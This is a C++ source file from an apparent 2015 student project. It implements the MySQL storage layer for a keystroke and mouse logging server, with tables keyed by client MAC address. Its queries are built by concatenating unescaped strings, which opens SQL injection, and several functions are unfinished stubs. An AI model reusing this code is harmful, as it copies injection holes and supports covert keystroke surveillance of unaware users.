//
// Database.cpp for  in /home/bbr2394/renduTek3/cpp_spider/source
// 
// Made by Bertrand-Rapello Baptiste
// Login   <bertra_l@epitech.net>
// 
// Started on  Wed Oct 21 21:04:15 2015 Bertrand-Rapello Baptiste
// Last update Fri Nov  6 16:36:20 2015 Antoine Plaskowski
//

#include	<ncurses.h>
#include	"Database.hpp"

Database::Database(std::string const &host,
		   std::string const &port,
		   std::string const &user) :
  m_sql(mysql_init(NULL))
{
  initscr();
  noecho();
  std::cout << "database password : ";
  std::string passwd;
  std::cin >> passwd;
  std::cout << std::endl;
  endwin();
  if (m_sql == NULL)
    throw std::exception();
  if (mysql_real_connect(m_sql, host.c_str(), user.c_str(), passwd.c_str(), NULL, std::stoul(port, nullptr, 10), NULL, 0) == NULL)
    throw std::exception();
}

Database::~Database(void)
{
  mysql_close(m_sql);
}

bool	Database::select_db(std::string const &db)
{
  static char const * const table[] =
    {
      "CREATE TABLE IF NOT EXISTS client"
      "(id_client BIGINT PRIMARY KEY NOT NULL AUTO_INCREMENT, mac_address CHARACTER(6) NOT NULL)",
      "CREATE TABLE IF NOT EXISTS keyboard_input"
      "(id_client BIGINT NOT NULL, second BIGINT NOT NULL, nano BIGINT NOT NULL, id_key BIGINT NOT NULL , id_event BIGINT NOT NULL, id_process BIGINT NOT NULL)",
      "CREATE TABLE IF NOT EXISTS mouse_input"
      "(id_client BIGINT NOT NULL, second BIGINT NOT NULL, nano BIGINT NOT NULL, id_button BIGINT NOT NULL, id_event BIGINT NOT NULL, id_process BIGINT NOT NULL)",
      "CREATE TABLE IF NOT EXISTS log_input"
      "(id_client BIGINT NOT NULL, id_log BIGINT NOT NULL)",
      "CREATE TABLE IF NOT EXISTS key_string"
      "(id_key BIGINT PRIMARY KEY NOT NULL AUTO_INCREMENT, string VARCHAR(255) NOT NULL)",
      "CREATE TABLE IF NOT EXISTS mouse_string"
      "(id_mouse BIGINT PRIMARY KEY NOT NULL AUTO_INCREMENT, string VARCHAR(255) NOT NULL)",
      "CREATE TABLE IF NOT EXISTS process_string"
      "(id_process BIGINT PRIMARY KEY NOT NULL AUTO_INCREMENT, string VARCHAR(255) NOT NULL)",
      "CREATE TABLE IF NOT EXISTS event_string"
      "(id_event BIGINT PRIMARY KEY NOT NULL AUTO_INCREMENT, string VARCHAR(255) NOT NULL)",
      "CREATE TABLE IF NOT EXISTS log_string"
      "(id_log BIGINT PRIMARY KEY NOT NULL AUTO_INCREMENT, string VARCHAR(255) NOT NULL)"
    };
  std::string	cmd;
  // char	*buf = new char[db.size() * 2 + 1];

  // if (mysql_real_escape_string(m_sql, buf, db.c_str(), db.size()) == -1)
  //   throw std::exception();
  cmd = "CREATE DATABASE IF NOT EXISTS " + db;
  if (mysql_query(m_sql, cmd.c_str()) != 0)
    throw std::exception();
  if (mysql_select_db(m_sql, db.c_str()) != 0)
    throw std::exception();
  for (uint64_t i = 0; i < sizeof(table) / sizeof(*table); i++)
    if (mysql_query(m_sql, table[i]) != 0)
      throw std::exception();
  return (false);
}

uint64_t	Database::get_id(std::string const &table, std::string const &column, std::string const &id_name, std::string const &search)
{
  std::string	cmd = "SELECT " + id_name + " FROM " + table + " WHERE " + column + " = " + search;
  if (mysql_query(m_sql, cmd.c_str()) != 0)
    throw std::exception();
  
  MYSQL_RES	*res = mysql_store_result(m_sql);
  uint64_t	num_rows = mysql_num_rows(res);
  if (num_rows == 1)
    {
      MYSQL_ROW	row = mysql_fetch_row(res);
      uint64_t	*sizes = mysql_fetch_lengths(res);
      std::string	id(row[0], sizes[0]);
      return (stoul(id));
    }
  else if (num_rows == 0)
    {
      cmd = "INSERT INTO " + table + " (" + column + ") VALUES (" + search + ")";
      if (mysql_query(m_sql, cmd.c_str()) != 0)
	throw std::exception();
      return (get_id(table, column, id_name, search));
    }
  throw std::exception();
}

bool	Database::insert_keyboard(std::string const &mac_address, IProtocol::Keyboard const &keyboard)
{
}

bool	Database::insert_mouse(std::string const &mac_address, IProtocol::Mouse const &mouse)
{
  return (false);
}

bool	Database::insert_log(std::string const &mac_address, IProtocol::Log const &log)
{
  return (false);
}

bool	Database::show(const std::string & mac_address)
{
  return false;
}

IDatabase	&new_idatabase(std::string const &host,
			       std::string const &port,
			       std::string const &user)
{
  return (*new Database(host, port, user));
}
